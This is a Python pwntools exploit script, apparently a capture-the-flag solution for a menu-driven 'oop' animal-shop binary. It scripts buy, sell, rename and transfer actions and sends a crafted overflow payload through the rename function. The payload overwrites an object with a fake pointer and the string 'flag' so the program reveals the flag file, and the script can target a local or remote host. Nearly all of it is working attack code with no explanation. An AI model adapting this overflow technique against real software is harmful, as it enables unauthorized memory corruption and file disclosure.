from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './oop'
HOST = '193.57.159.27'
PORT = 31978
HOST = '172.17.0.2'
PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x1e74])

def s():
	r.sendlineafter('> ', '1')

def buy(t, name):
	r.sendlineafter('> ', '3')
	r.sendlineafter('> ', str(t))
	r.sendlineafter('? ', name)

def sell(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter('? ', str(idx))
	r.sendlineafter('> ', '1')
def feed(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter('? ', str(idx))
	r.sendlineafter('> ', '2')
def rename(idx, name):
	r.sendlineafter('> ', '2')
	r.sendlineafter('? ', str(idx))
	r.sendlineafter('> ', '3')
	r.sendlineafter('? ', name)
def trans(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter('> ', '2')
	r.sendlineafter('? ', str(idx))
	r.sendlineafter('> ', '4')

buy(1, 'A'*8)
payload = ''
payload += 'a' * 0x1c
payload += flat(0x41, 0x404d78, u64("flag".ljust(8, '\x00')), 0)
payload += p32(0x7e00ff00)
for i in range(10):
	buy(2, 'B'*8)
	ret = r.recvuntil('1) List Animals')
	if 'died' in ret:
		buy(1, 'A'*8)
	rename(0, payload)
	ret = r.recvuntil('1) List Animals')
	if 'died' in ret:
		buy(1, 'A'*8)
	sell(1)
	ret = r.recvuntil('1) List Animals')
	if 'died' in ret:
		buy(1, 'A'*8)

buy(2, 'B'*8)
rename(0, payload)
trans(1)
r.interactive()
r.close()
